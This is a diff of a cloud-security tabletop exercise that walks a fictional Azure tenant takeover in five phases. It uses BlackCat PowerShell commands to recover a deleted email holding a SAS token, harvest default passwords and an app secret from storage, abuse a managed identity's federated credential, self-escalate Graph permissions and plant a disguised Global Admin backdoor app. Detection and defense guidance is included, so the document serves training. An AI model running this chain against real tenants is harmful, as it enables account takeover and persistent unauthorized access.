@@ -1,6 +1,6 @@
-# MC2 Connect: Complete Tenant Takeover via Exposed Configuration
+# 🎯 TABLETOP EXERCISE: Complete Tenant Takeover via Exposed Configuration
 
-## Overview
+## Exercise Overview
 
 | Attribute | Details |
 |-----------|---------|
@@ -19,38 +19,41 @@
 
 ---
 
-## Attack Flow Diagram
+## 🗺️ Attack Flow Diagram
 
 ```mermaid
 flowchart LR
-    subgraph Phase1["Phase 1: Anonymous<br/>(5 min)"]
-        A1[Find-SubDomain]
-        A2[Find-PublicStorageContainer]
-        A3[Read-SASToken]
+    subgraph Phase1["🔍 Phase 1: Anonymous<br/>(5 min)"]
+        A1[Find-PublicStorageContainer]
+        A2[Get-PublicBlobContent -IncludeDeleted]
+        A3[Download Deleted Email]
+        A4[Read-SASToken]
     end
 
-    subgraph Phase2["Phase 2: Storage<br/>(10 min)"]
-        B1[Enumerate Directories]
-        B2[Download Config]
-        B3[Extract Credentials]
+    subgraph Phase2["📦 Phase 2: Storage<br/>(10 min)"]
+        B1[Enumerate File Share]
+        B2[Find Default Passwords]
+        B3[Access Soft-deleted /config]
+        B4[Extract App Secret]
     end
 
-    subgraph Phase3["Phase 3: Azure Recon<br/>(10 min)"]
+    subgraph Phase3["🔎 Phase 3: Azure Recon<br/>(10 min)"]
         C1[Connect-ServicePrincipal]
         C2[Get-RoleAssignment]
         C3[Get-ManagedIdentity]
         C4[Get-ServicePrincipalsPermission]
     end
 
-    subgraph Phase4["Phase 4: UAMI<br/>(15 min)"]
+    subgraph Phase4["⚡ Phase 4: UAMI<br/>(15 min)"]
         D1[Set-FederatedIdentity]
         D2[GitHub OIDC Token]
         D3[Exchange for UAMI Token]
     end
 
-    subgraph Phase5["Phase 5: Takeover<br/>(5 min)"]
-        E1[Add-EntraApplication]
-        E2[Global Admin!]
+    subgraph Phase5["👑 Phase 5: Takeover<br/>(5 min)"]
+        E1[Set-ManagedIdentityPermission]
+        E2[Add-EntraApplication]
+        E3[Global Admin!]
     end
 
     Phase1 --> Phase2 --> Phase3 --> Phase4 --> Phase5
@@ -66,19 +69,30 @@ flowchart LR
 
 ```mermaid
 flowchart TD
-    A[👤 Anonymous Attacker] -->|DNS Enumeration| B[Storage Account Discovered]
-    B -->|SAS Token Abuse| C[Config File Downloaded]
-    C -->|Extract Credentials| D[App Secret Obtained]
-    D -->|Connect-ServicePrincipal| E[Authenticated to Azure]
-    E -->|Get-ManagedIdentity| F[UAMI Discovered]
-    F -->|Get-ServicePrincipalsPermission| G[Application.ReadWrite.All Found]
-    G -->|Set-FederatedIdentity| H[GitHub OIDC Trust Added]
-    H -->|Token Exchange| I[UAMI Token Obtained]
-    I -->|Add-EntraApplication| J[Global Admin Achieved]
+    A[👤 Anonymous Attacker] -->|DNS Enumeration| B[🌐 Public Blob Container Found]
+    B -->|Get-PublicBlobContent -IncludeDeleted| C[📧 Deleted Welcome Email]
+    C -->|Extract SAS Token from link| D[🔑 Access to File Share]
+    
+    D --> E{What's in the storage?}
+    
+    E -->|Employee Folders| F[👤 Default Passwords]
+    E -->|Soft-deleted /config| G[📄 App Secret]
+    
+    F -->|Login as User| H[Lateral Movement Path]
+    
+    G -->|Connect-ServicePrincipal| I[🔓 Azure Access]
+    I -->|Get-ManagedIdentity| J[🎯 UAMI Discovered]
+    J -->|Get-ServicePrincipalsPermission| K[⚠️ AppRoleAssignment.ReadWrite.All]
+    K -->|Set-FederatedIdentity| L[🔗 GitHub OIDC Trust]
+    L -->|Token Exchange| M[🎫 UAMI Token]
+    M -->|Set-ManagedIdentityPermission| N[⬆️ Self-Escalation]
+    N -->|Add-EntraApplication| O[👑 Global Admin!]
 
     style A fill:#e3f2fd
-    style J fill:#ffcdd2
-    style G fill:#fff9c4
+    style O fill:#ffcdd2
+    style K fill:#fff9c4
+    style F fill:#fff9c4
+    style C fill:#fff9c4
 ```
 
 ---
@@ -97,7 +111,7 @@ flowchart TD
 
 ---
 
-## Scenario Background
+## 🏢 Scenario Background
 
 ### Company Profile: Blue Mountain Travel Ltd.
 
@@ -114,43 +128,101 @@ Blue Mountain Travel is a UK-based travel agency undergoing digital transformati
 ```mermaid
 timeline
     title How the Vulnerability Chain Was Created
-    2025-06-15 : DevOps creates UAMI for CI/CD
-               : UAMI gets Application.ReadWrite.All
-    2025-09-20 : Developer commits .env.production to GitHub
-               : Credentials exposed in git history
-    2025-10-05 : Config files copied to Azure Files /config folder
-               : Backup of credentials in storage
-    2025-11-15 : Files "deleted" but soft-delete retains them
-               : Configs accessible via recycle bin
-    2025-12-20 : SAS token shared in email for "temporary" access
-               : Token has 2+ year expiry with list permissions
-    2026-01-21 : TODAY - Attacker discovers the chain
+    2025-06-15 : DevOps creates UAMI for HR CI/CD
+               : UAMI gets broad permissions "just in case"
+    2025-10-05 : Config file with app secret copied to file share
+               : "Backup" in /config folder
+    2025-11-15 : IT "deletes" config folder
+               : Soft-delete retains files for 30+ days
+    2026-01-15 : HR uploads welcome email to WRONG container
+               : Onboarding-Welcome-Email.eml in public blob
+    2026-01-16 : HR notices mistake and deletes the email
+               : But versioning is enabled - file still exists!
+    2026-01-20 : New employees onboarded
+               : Welcome docs with default passwords uploaded
+    2026-01-22 : TODAY - Attacker discovers the chain
                : Attack begins
 ```
 
 | Date | Event | Risk Created |
 |------|-------|--------------|
-| 2025-06-15 | DevOps creates UAMI for CI/CD | UAMI gets `Application.ReadWrite.All` |
-| 2025-09-20 | Developer commits `.env.production` to GitHub | Credentials exposed in git history |
-| 2025-10-05 | Config files copied to Azure Files `/config` folder | Backup of credentials in storage |
-| 2025-11-15 | Files "deleted" but soft-delete retains them | Configs accessible via recycle bin |
-| 2025-12-20 | SAS token shared in email for "temporary" access | Token has 2+ year expiry, list permissions |
-| 2026-01-21 | **TODAY**: Attacker discovers the chain | Attack begins |
+| 2025-06-15 | DevOps creates UAMI for HR automation | Broad permissions granted "for future use" |
+| 2025-10-05 | Config file copied to Azure Files `/config` folder | App secret exposed in storage |
+| 2025-11-15 | IT "deletes" `/config` folder | Files still accessible via soft-delete |
+| 2026-01-15 | HR uploads `Onboarding-Welcome-Email.eml` to **public container** | Email contains SAS token link to Azure Files |
+| 2026-01-16 | HR deletes the email after noticing the mistake | **Versioning enabled** - deleted file still enumerable! |
+| 2026-01-20 | New employee onboarding batch processed | Welcome docs with default passwords uploaded |
+| 2026-01-22 | **TODAY**: Attacker discovers the chain | Attack begins |
+
+### The Permission Creep Story
+
+> **How did the UAMI get `AppRoleAssignment.ReadWrite.All`?** This is the insidious one. HR automation legitimately needs to assign new employees to SaaS applications (Salesforce, ServiceNow, etc.). The permission name sounds harmless - "assign app roles" - but it's actually one of the most dangerous permissions in Microsoft Graph.
+
+| Permission | Justification Given | Actual Need | Real Risk |
+|------------|---------------------|-------------|----------|
+| `User.ReadWrite.All` | "Create new employee accounts" | ✅ Legitimate | Medium |
+| `Group.ReadWrite.All` | "Add employees to department groups" | ✅ Legitimate | Medium |
+| `AppRoleAssignment.ReadWrite.All` | "Assign new employees to Salesforce, ServiceNow, etc." | ✅ Sounds legitimate | **CRITICAL** |
+
+**Why `AppRoleAssignment.ReadWrite.All` is so dangerous:**
+
+```
+"We need to assign new hires to enterprise apps" ← Sounds reasonable
+                    +
+AppRoleAssignment.ReadWrite.All grants this ← Approved!
+                    +
+But this permission can also grant ANY permission to ANY app ← Not understood
+                    =
+Attacker can grant themselves RoleManagement.ReadWrite.Directory 💀
+```
+
+**The hidden attack path:**
+
+```powershell
+# Step 1: Grant the UAMI more permissions (using AppRoleAssignment.ReadWrite.All)
+Set-ManagedIdentityPermission -servicePrincipalId $UamiObjectId `
+    -CommonResource MicrosoftGraph `
+    -appRoleName "RoleManagement.ReadWrite.Directory"
+
+# Step 2: Now the UAMI can assign Global Admin
+Add-EntraApplication -DisplayName "Backdoor-App"
+```
 
 ---
 
-## Exposed Configuration File
+## 📁 Storage Structure & Exposed Files
 
-### File Location in Storage Account
+### Public Blob Container (hr-templates) - With Versioning Enabled
 
 ```
 bluemountaintravelsa (Storage Account)
-├── docs (File Share)
-│   └── /config (Folder - "deleted" but in recycle bin)
-│       └── app-config.json
+├── hr-templates (Blob Container - PUBLIC ACCESS + VERSIONING)
+│   └── 🗑️ Onboarding-Welcome-Email.eml    ← DELETED but version exists!
+│                                            Contains SAS token to Azure Files
 ```
 
-### Minimal Exposed Configuration
+**The deleted email is invisible in normal listing, but `Get-PublicBlobContent -IncludeDeleted` reveals it!**
+
+### Private File Share (docs) - Accessible via SAS Token in Email
+
+```
+bluemountaintravelsa (Storage Account)
+├── docs (File Share - Private, but SAS token leaked in deleted email)
+│   ├── /config                      ← "Deleted" folder (soft-delete active)
+│   │   └── app-config.json          ← App Registration secret
+│   ├── /peter-parker
+│   │   ├── Welcome.html             ← Default password: Travel@2026!
+│   │   ├── First-Day-Instructions.html
+│   │   ├── IT-Equipment.html
+│   │   └── Training-Schedule.html
+│   ├── /hermione-granger
+│   │   └── Welcome.html             ← Default password: Travel@2026!
+│   ├── /luke-skywalker
+│   │   └── Welcome.html             ← Default password: Travel@2026!
+│   └── ... more employee folders
+```
+
+### Exposed Configuration File
 
 **File: `/config/app-config.json`** (In recycle bin - minimal but enough to pivot)
 
@@ -172,7 +244,7 @@ bluemountaintravelsa (Storage Account)
 
 ---
 
-## PHASE 1: Anonymous Reconnaissance (5 minutes)
+## 🎭 PHASE 1: Anonymous Reconnaissance (5 minutes)
 
 ### Attacker Actions
 
@@ -180,67 +252,177 @@ bluemountaintravelsa (Storage Account)
 # Step 1: DNS record discovery
 Find-DnsRecord -Domain "bluemountaintravel.uk"
 
-# Step 2: Find DNS records for azure resources
+# Step 2: Find DNS records for Azure resources
 Find-AzurePublicResource -Name "bluemountaintravel"
 
 # Step 3: Discover public storage containers
 Find-PublicStorageContainer -StorageAccountName "bluemountaintravelsa"
 
-# Step 4: If a SAS token is found (email, paste site, GitHub), analyze it
+# Output:
+# StorageAccount         Container      AccessLevel
+# --------------         ---------      -----------
+# bluemountaintravelsa   hr-templates   Blob         <-- Public container!
+
+# Step 4: List contents - appears empty!
+$publicUrl = "https://bluemountaintravelsa.blob.core.windows.net/hr-templates"
+Get-PublicBlobContent -BlobUrl $publicUrl -ListOnly
+
+# Output: No files found (the email was deleted)
+```
+
+### Discovering Deleted Files
+
+**But wait - what if there are deleted files with versioning enabled?**
+
+```powershell
+# Step 5: Check for deleted blobs using BlackCat
+Get-PublicBlobContent -BlobUrl $publicUrl -ListOnly -IncludeDeleted
+
+# Output:
+# Name                              Status       VersionId
+# ----                              ------       ---------
+# 📄 Onboarding-Welcome-Email.eml   🗑️ Deleted   2026-01-15T14:32:00Z
+
+# Step 6: Download the deleted email
+Get-PublicBlobContent -BlobUrl $publicUrl -OutputPath ./loot -IncludeDeleted
+
+# ✅ Downloaded: Onboarding-Welcome-Email.eml
+```
+
+### Inspecting the .eml File
+
+An `.eml` file is just a text file - open it in any editor or simply display it:
+
+```powershell
+# Option 1: Display in terminal
+Get-Content ./loot/Onboarding-Welcome-Email.eml
+
+# Option 2: Open in VS Code (demo-friendly!)
+code ./loot/Onboarding-Welcome-Email.eml
+
+# Option 3: Search for any URLs
+Select-String -Path ./loot/*.eml -Pattern "https://"
+```
+
+**What we see in the email (scrolling through the HTML):**
+
+```html
+<ul>
+    <li><a href="https://bluemountaintravelsa.file.core.windows.net/docs/firstname-lastname/Welcome.html?sv=2024-11-04&ss=f&srt=sco&sp=rl&se=2028-01-21T22:14:47Z&st=2026-01-21T13:59:47Z&spr=https,http&sig=X568VG5xyLVY9xLl9eoSa4oJM0wzRIkLHeHlixtwAkM%3D">
+        <strong>Welcome.html</strong></a> - Your temporary login credentials</li>
+    ...
+</ul>
+```
+
+**Attacker immediately notices:**
+- Azure Storage URL (`bluemountaintravelsa.file.core.windows.net`)
+- Long query string = SAS token
+- Multiple links all share the same token
+
+**Copy the URL and test it in browser - it works!**
+
+**Analyze the SAS token:**
+
+```powershell
 $sasToken = "?sv=2024-11-04&ss=f&srt=sco&sp=rl&se=2028-01-21..."
 Read-SASToken -SASToken $sasToken
 
 # Output shows:
 #   Service: File
-#   ResourceTypes: Service, Container, Object
-#   Permissions: Read, List  <-- Can enumerate everything!
-#   Expiry: 2028-01-21       <-- Valid for 2+ years!
+#   ResourceTypes: Service, Container, Object  <-- srt=sco!
+#   Permissions: Read, List                    <-- Can enumerate everything!
+#   Expiry: 2028-01-21                         <-- Valid for 2+ years!
+
+# The SAS token was meant for ONE user's folder, but srt=sco means
+# it can enumerate the ENTIRE file share!
 ```
 
 ### Discussion Points
-- How was the SAS token discovered? (Email, paste site, git history, public repo)
-- What makes this SAS token dangerous? (`srt=sco` + `sp=rl` = enumerate everything)
-- What did `Read-SASToken` reveal about the token's capabilities?
+- Why did `Get-PublicBlobContent -ListOnly` show no files, but `-IncludeDeleted` found one?
+- HR deleted the email to "fix" the mistake - why didn't that work?
+- What's the difference between soft-delete and versioning?
+- The SAS token was scoped too broadly (`srt=sco`) - what should it have been?
 
 ### Detection Opportunities
 
 | Detection | Log Source | Query |
 |-----------|------------|-------|
-| Unusual storage enumeration | Storage Analytics | High volume LIST operations from unknown IP |
-| SAS token usage from unexpected location | Storage Analytics | GeoIP mismatch with expected regions |
-| Directory listing API calls | Azure Monitor | `restype=directory&comp=list` in URLs |
+| Public container listing with versions | Storage Analytics | Anonymous LIST with `include=versions` |
+| Download of deleted blob version | Storage Analytics | GET with `?versionId=` parameter |
+| Enumeration from unknown IP | Storage Analytics | Anonymous operations from unexpected geo |
 
 ---
 
-## PHASE 2: Storage Access & Credential Extraction (10 minutes)
+## 🔓 PHASE 2: Storage Access & Credential Extraction (10 minutes)
 
 ### Attacker Actions
 
+The SAS token from the deleted email was meant for a single user's folder, but it was created with overly broad scope (`srt=sco` = Service, Container, Object). This means it can access the **entire file share**!
+
 ```powershell
-# Using the SAS token discovered in Phase 1
+# Using the SAS token extracted from the deleted email
 $storageAccount = "bluemountaintravelsa"
 $fileShare = "docs"
 $sasToken = "?sv=2024-11-04&ss=f&srt=sco&sp=rl..."
 
-# Step 1: List root directory
+# Step 1: List root directory (the SAS token allows this!)
 $baseUrl = "https://$storageAccount.file.core.windows.net/$fileShare"
 $listUrl = "$baseUrl`?restype=directory&comp=list&$sasToken"
 $directories = Invoke-RestMethod -Uri $listUrl
 
-# Discovers: /config folder (even if "deleted" - soft-delete retains it)
+# Discovers folders:
+#   /config          <-- "Deleted" but soft-delete retains it
+#   /peter-parker    <-- New employee folder
+#   /hermione-granger
+#   /luke-skywalker
+#   ... more employee folders
+```
 
-# Step 2: List config folder contents
+### 🔑 Discovery 1: Default Passwords in Onboarding Documents
+
+```powershell
+# Step 2: List a user folder
+$userFolderUrl = "$baseUrl/peter-parker?restype=directory&comp=list&$sasToken"
+Invoke-RestMethod -Uri $userFolderUrl
+
+# Discovers: Welcome.html, First-Day-Instructions.html, IT-Equipment.html
+
+# Step 3: Download welcome document
+$welcomeUrl = "$baseUrl/peter-parker/Welcome.html$sasToken"
+Invoke-WebRequest -Uri $welcomeUrl -OutFile "Welcome-Peter-Parker.html"
+```
+
+**Welcome document contains default password:**
+
+```html
+<div class="credential-box">
+    <div class="credential-row">
+        <span class="credential-label">Email/Username:</span>
+        <span class="credential-value">peter.parker@bluemountaintravel.uk</span>
+    </div>
+    <div class="credential-row">
+        <span class="credential-label">Temporary Password:</span>
+        <span class="credential-value password-highlight">Travel@2026!</span>
+    </div>
+</div>
+```
+
+> **⚠️ Attack Path Option:** If Peter Parker hasn't logged in yet to change his password, the attacker can now access the tenant as a legitimate user! This is a **separate attack vector** that we'll note but won't follow in this exercise.
+
+### 🔐 Discovery 2: App Configuration with Secrets
+
+```powershell
+# Step 4: Access "deleted" config folder (soft-delete still accessible)
 $configUrl = "$baseUrl/config?restype=directory&comp=list&$sasToken"
 $configFiles = Invoke-RestMethod -Uri $configUrl
 
-# Step 3: Download the configuration file
+# Step 5: Download the configuration file
 $configFileUrl = "$baseUrl/config/app-config.json$sasToken"
 Invoke-RestMethod -Uri $configFileUrl -OutFile "app-config.json"
 
-# Step 4: Extract credentials
+# Step 6: Extract credentials
 $config = Get-Content app-config.json | ConvertFrom-Json
 $tenantId = $config.azure.tenantId
-$subscriptionId = $config.azure.subscriptionId
 $clientId = $config.deployment.clientId
 $clientSecret = $config.deployment.clientSecret
 
@@ -249,26 +431,60 @@ Write-Host "Found credentials for App: $clientId in tenant: $tenantId"
 
 ### What Was Found
 
-| Secret | Value | Next Step |
-|--------|-------|-----------|
+| Secret Type | Value | Impact |
+|-------------|-------|--------|
+| **Employee Credentials** | `peter.parker@bluemountaintravel.uk` / `Travel@2026!` | User account access (if not changed) |
+| **More Employees** | Same pattern in other folders | Multiple potential access points |
 | Tenant ID | `67f8647a-6555-...` | Target tenant identified |
 | Subscription ID | `a1b2c3d4-e5f6-...` | Azure scope for enumeration |
 | Client ID | `1950a258-227b-...` | App Registration to authenticate as |
-| Client Secret | `Kvj8Q~9pL2...` | Credential to authenticate |
+| Client Secret | `Kvj8Q~9pL2...` | **Leads to complete takeover!** |
 
-**Key Question:** What can this App Registration do? We need to authenticate and find out!
+### Two Attack Paths Identified
+
+```mermaid
+flowchart TD
+    A[📦 Azure Files Access] --> B{What did we find?}
+    
+    B --> C[👤 Employee Credentials]
+    B --> D[🔑 App Registration Secret]
+    
+    C --> E[Login as new employee]
+    E --> F[Phishing / Data Access / Lateral Movement]
+    
+    D --> G[Connect-ServicePrincipal]
+    G --> H[Enumerate Azure Resources]
+    H --> I[Find UAMI with Graph Permissions]
+    I --> J[👑 Complete Tenant Takeover]
+    
+    style D fill:#ffcdd2
+    style J fill:#ffcdd2
+    style C fill:#fff9c4
+    
+    linkStyle 3 stroke:#f44336,stroke-width:3px
+    linkStyle 4 stroke:#f44336,stroke-width:3px
+    linkStyle 5 stroke:#f44336,stroke-width:3px
+    linkStyle 6 stroke:#f44336,stroke-width:3px
+```
+
+**We'll follow the App Registration path (red) - it leads to Global Admin!**
+
+### Discussion Points
+- Which finding is more immediately dangerous: employee passwords or app secret?
+- How could the employee passwords be exploited in a real attack?
+- What makes the "deleted" config file still accessible?
 
 ### Detection Opportunities
 
 | Detection | Log Source | Alert |
 |-----------|------------|-------|
 | Access to soft-deleted items | Storage Analytics | Access to files in `$deleted` paths |
-| Bulk file downloads | Storage Analytics | Multiple GET operations in short window |
-| Config file access patterns | Storage Analytics | Access to `*.json`, `*.yaml`, `*.env` files |
+| Bulk enumeration of user folders | Storage Analytics | Directory listing multiple paths |
+| Access to sensitive file patterns | Storage Analytics | Access to `*.json`, `*.yaml`, `*.html` in bulk |
 
 ---
 
-## PHASE 3: Authenticated Azure Reconnaissance (10 minutes)
+## 🔍 PHASE 3: Authenticated Azure Reconnaissance (10 minutes)
 
 **This is the critical discovery phase using BlackCat functions!**
 
@@ -276,11 +492,14 @@ Write-Host "Found credentials for App: $clientId in tenant: $tenantId"
 
 ```powershell
 # Connect using the stolen App Registration credentials
-Connect-ServicePrincipal `
-    -ServicePrincipalId "1950a258-227b-4e31-a9cf-717495945fc2" `
-    -TenantId "67f8647a-6555-4c70-bee4-45625d332c3f" `
-    -ClientSecret "Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2" `
-    -SubscriptionId "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+params = @{
+    ServicePrincipalId = "1950a258-227b-4e31-a9cf-717495945fc2"
+    TenantId = "67f8647a-6555-4c70-bee4-45625d332c3f"
+    ClientSecret = "Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2"
+    SubscriptionId = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+}
+
+Connect-ServicePrincipal @params
 
 # Output shows:
 #   DisplayName: HR-Onboarding-Legacy-Deployment
@@ -326,13 +545,23 @@ Get-ServicePrincipalsPermission -ServicePrincipalId "3fa85f64-5717-4562-b3fc-2c9
 # DisplayName: uami-hr-cicd-automation
 # 
 # Application Permissions:
-#   Permission                          ResourceApp
-#   ----------                          -----------
-#   Application.ReadWrite.All           Microsoft Graph    ← DANGEROUS!
-#   AppRoleAssignment.ReadWrite.All     Microsoft Graph    ← DANGEROUS!
-#   User.Read.All                       Microsoft Graph
+#   Permission                              ResourceApp
+#   ----------                              -----------
+#   User.ReadWrite.All                      Microsoft Graph    ← Create employee accounts
+#   Group.ReadWrite.All                     Microsoft Graph    ← Add users to groups  
+#   AppRoleAssignment.ReadWrite.All         Microsoft Graph    ← Assign users to apps
 #
-# These permissions allow creating App Registrations and assigning permissions!
+# Wait... AppRoleAssignment.ReadWrite.All? That sounds harmless...
+# 
+# ⚠️ CRITICAL INSIGHT: AppRoleAssignment.ReadWrite.All is deceptively named!
+# It can:
+#   1. Assign users to applications (the "legitimate" use)
+#   2. Grant ANY Graph API permission to ANY service principal!
+#   3. Including granting RoleManagement.ReadWrite.Directory to ITSELF
+#   = Self-escalation to tenant takeover!
+# 
+# This permission was approved because "HR needs to assign new employees to 
+# Salesforce and ServiceNow". Nobody realized the hidden danger.
 ```
 
 ### Step 5: Check for Existing Federated Credentials
@@ -358,9 +587,10 @@ $existingFics = Invoke-RestMethod -Uri $ficUrl -Headers $script:authHeader
 | Discovery | Implication |
 |-----------|-------------|
 | SP has Contributor on subscription | Can modify any Azure resource, including UAMIs |
-| UAMI exists with Application.ReadWrite.All | Can create apps and assign Graph permissions |
+| UAMI has `User.ReadWrite.All` + `Group.ReadWrite.All` | Legitimate for HR onboarding |
+| UAMI has `AppRoleAssignment.ReadWrite.All` | **CRITICAL!** Can grant ANY permission to ANY service principal |
+| **Self-Escalation Path** | Use `AppRoleAssignment.ReadWrite.All` → grant itself `RoleManagement.ReadWrite.Directory` → Create app with Global Admin |
 | UAMI already has GitHub FIC | Pattern is established, another FIC won't be suspicious |
-| AppRoleAssignment.ReadWrite.All | Can assign any permission to service principals |
 
 ### Discussion Points
 - What made `Get-ManagedIdentity` so valuable?
@@ -377,60 +607,72 @@ $existingFics = Invoke-RestMethod -Uri $ficUrl -Headers $script:authHeader
 
 ---
 
-## PHASE 4: UAMI Exploitation via Federated Credentials (15 minutes)
+## ⚡ PHASE 4: UAMI Exploitation via Federated Credentials (15 minutes)
 
 ### Understanding the Attack Chain
 
 ```mermaid
 flowchart TD
-    A[Attacker's GitHub Repository] -->|1. Workflow triggers| B[GitHub OIDC Token]
+    A[🐙 Attacker's GitHub Repository] -->|1. Workflow triggers| B[📜 GitHub OIDC Token]
     
-    subgraph Azure["Azure / Entra ID"]
-        C[UAMI with FIC]
-        D[UAMI Access Token]
-        E[Microsoft Graph API]
+    subgraph Azure["☁️ Azure / Entra ID"]
+        C[🔐 UAMI with FIC]
+        D[🎫 UAMI Access Token]
+        E[📊 Microsoft Graph API]
     end
     
     B -->|2. Token Exchange| C
     C -->|3. Issues token with| D
-    D -->|4. Has Application.ReadWrite.All| E
-    E -->|5. Create App + Global Admin| F[Tenant Takeover]
+    D -->|4. Has AppRoleAssignment.ReadWrite.All| E
+    
+    subgraph Escalation["⬆️ Self-Escalation"]
+        S1[Set-ManagedIdentityPermission]
+        S2[Grant RoleManagement.ReadWrite.Directory]
+    end
+    
+    E -->|5. Escalate permissions| S1
+    S1 --> S2
+    S2 -->|6. Now can assign roles| F[Add-EntraApplication]
+    F -->|7. Create app + Global Admin| G[👑 Tenant Takeover]
 
-    subgraph Prerequisite["Prerequisite: Add FIC to UAMI"]
+    subgraph Prerequisite["⚙️ Prerequisite: Add FIC to UAMI"]
         P1[SP with Contributor] -->|Set-FederatedIdentity| P2[Trust attacker's repo]
     end
 
     P2 -.->|Enables| A
 
     style A fill:#24292e,color:#fff
-    style F fill:#ffcdd2
+    style G fill:#ffcdd2
     style C fill:#e3f2fd
     style D fill:#c8e6c9
+    style S2 fill:#fff9c4
 ```
 
 ### Permission Boundary Crossing
 
 ```mermaid
 flowchart LR
-    subgraph AzureRBAC["Azure RBAC Boundary"]
+    subgraph AzureRBAC["🔷 Azure RBAC Boundary"]
         AR1[Contributor Role]
         AR2[Modify UAMI Resource]
         AR3[Add Federated Credential]
     end
 
-    subgraph EntraID["Entra ID Boundary"]
+    subgraph EntraID["🔶 Entra ID Boundary"]
         EI1[UAMI Service Principal]
-        EI2[Application.ReadWrite.All]
-        EI3[Create App Registrations]
-        EI4[Assign Directory Roles]
+        EI2[AppRoleAssignment.ReadWrite.All]
+        EI3[Set-ManagedIdentityPermission]
+        EI4[Grant RoleManagement.ReadWrite.Directory]
+        EI5[Add-EntraApplication + Global Admin]
     end
 
     AR1 --> AR2 --> AR3
     AR3 -->|"Crosses Boundary!"| EI1
-    EI1 --> EI2 --> EI3 --> EI4
+    EI1 --> EI2 --> EI3 --> EI4 --> EI5
 
     style AR3 fill:#fff9c4,stroke:#f57f17
     style EI1 fill:#fff9c4,stroke:#f57f17
+    style EI4 fill:#ffcdd2,stroke:#d32f2f
 ```
 
 ### Step 1: Add Federated Credential to UAMI
@@ -510,16 +752,35 @@ jobs:
 
 ---
 
-## PHASE 5: Tenant Takeover (5 minutes)
+## 👑 PHASE 5: Tenant Takeover (5 minutes)
 
-### Using BlackCat's Add-EntraApplication
+### Step 1: Self-Escalation via Set-ManagedIdentityPermission
 
-The UAMI token (obtained via GitHub OIDC exchange) has `Application.ReadWrite.All`. BlackCat has a function specifically for this:
+The UAMI token has `AppRoleAssignment.ReadWrite.All`. This permission can grant **any** Graph API permission to **any** service principal - including itself!
 
 ```powershell
 # After authenticating with the UAMI token from GitHub Actions,
-# use BlackCat's Add-EntraApplication to create a malicious app with Global Admin
+# First, use BlackCat's Set-ManagedIdentityPermission to escalate the UAMI's own permissions
 
+# Get the Microsoft Graph service principal ID (needed for granting Graph permissions)
+$graphSp = Invoke-MsGraph -relativeUrl "servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'" -NoBatch
+$graphResourceId = $graphSp.value[0].id
+
+# Grant the UAMI the ability to assign directory roles
+Set-ManagedIdentityPermission `
+    -servicePrincipalId "3fa85f64-5717-4562-b3fc-2c963f66afa6" `
+    -CommonResource MicrosoftGraph `
+    -appRoleName "RoleManagement.ReadWrite.Directory"
+
+# The UAMI just granted ITSELF the permission to assign Global Admin!
+```
+
+### Step 2: Create Global Admin Application
+
+Now that the UAMI has `RoleManagement.ReadWrite.Directory`, we can use `Add-EntraApplication`:
+
+```powershell
+# Use BlackCat's Add-EntraApplication to create a malicious app with Global Admin
 Add-EntraApplication -DisplayName "Azure-Backup-Automation-Service"
 
 # This function automatically:
@@ -567,17 +828,18 @@ $secret = Invoke-RestMethod `
 
 ### Attack Complete - What Was Achieved
 
-| Achievement | Details |
-|-------------|---------|
-| **Global Admin SP** | "Azure-Backup-Automation-Service" with GA role |
-| **Persistent Secret** | 2-year client secret for continued access |
-| **Independent Access** | Works even if UAMI/GitHub access is revoked |
-| **Stealthy Name** | Looks like legitimate backup automation |
+| Step | Achievement | Details |
+|------|-------------|---------|
+| **Self-Escalation** | UAMI granted itself `RoleManagement.ReadWrite.Directory` | Using `Set-ManagedIdentityPermission` |
+| **Global Admin SP** | "Azure-Backup-Automation-Service" with GA role | Created via `Add-EntraApplication` |
+| **Persistent Secret** | 2-year client secret for continued access | Independent of UAMI |
+| **Stealthy Name** | Looks like legitimate backup automation | Low suspicion |
 
 ### Persistence Mechanisms Created
 
 | Mechanism | Description | Detection Difficulty |
 |-----------|-------------|---------------------|
+| UAMI Permission Escalation | UAMI now has `RoleManagement.ReadWrite.Directory` | **Low** (visible in audit logs) |
 | Malicious App Registration | "Azure-Backup-Automation-Service" with admin permissions | Medium |
 | Client Secret | 2-year validity, named "Backup Key" | Low (if audited) |
 | Federated Credential on UAMI | Persistent GitHub → Azure access | Medium |
@@ -593,18 +855,18 @@ $secret = Invoke-RestMethod `
 
 | Detection | Log Source | Alert Priority |
 |-----------|------------|----------------|
-| New App Registration | Entra ID Audit Logs | Critical |
-| Global Admin role assignment | Entra ID Audit Logs | Critical |
-| Service principal sign-in from new app | Entra ID Sign-in Logs | High |
-| Client secret added to application | Entra ID Audit Logs | High |
+| New App Registration | Entra ID Audit Logs | 🔴 Critical |
+| Global Admin role assignment | Entra ID Audit Logs | 🔴 Critical |
+| Service principal sign-in from new app | Entra ID Sign-in Logs | 🟡 High |
+| Client secret added to application | Entra ID Audit Logs | 🟡 High |
 
 ---
 
-## DEFENSES & DETECTIONS (Summary)
+## 🛡️ DEFENSES & DETECTIONS (Summary)
 
 ```mermaid
 flowchart TD
-    subgraph Prevention["Prevention Layer"]
+    subgraph Prevention["🛡️ Prevention Layer"]
         P1[No List-enabled SAS Tokens]
         P2[Private Endpoints for Storage]
         P3[Credential Scanning in CI/CD]
@@ -612,7 +874,7 @@ flowchart TD
         P5[Azure Policy: Block FIC creation]
     end
     
-    subgraph Detection["Detection Layer"]
+    subgraph Detection["🔍 Detection Layer"]
         D1[Storage Analytics Logs]
         D2[Azure Activity Logs]
         D3[Entra ID Audit Logs]
@@ -620,7 +882,7 @@ flowchart TD
         D5[Microsoft Sentinel Rules]
     end
     
-    subgraph Response["Response Layer"]
+    subgraph Response["⚡ Response Layer"]
         R1[Revoke SAS Tokens]
         R2[Rotate Storage Keys]
         R3[Delete Malicious Apps]
@@ -693,7 +955,7 @@ AuditLogs
 
 ---
 
-## Key Takeaways
+## 🎯 Key Takeaways
 
 ### For Blue Teams
 
@@ -722,7 +984,7 @@ AuditLogs
 
 ---
 
-## BlackCat Functions Used
+## 📋 BlackCat Functions Used
 
 | Phase | Function | Purpose |
 |-------|----------|---------|
@@ -739,7 +1001,7 @@ AuditLogs
 
 ---
 
-## Exercise Materials
+## 📋 Exercise Materials
 
 | File | Purpose |
 |------|---------|
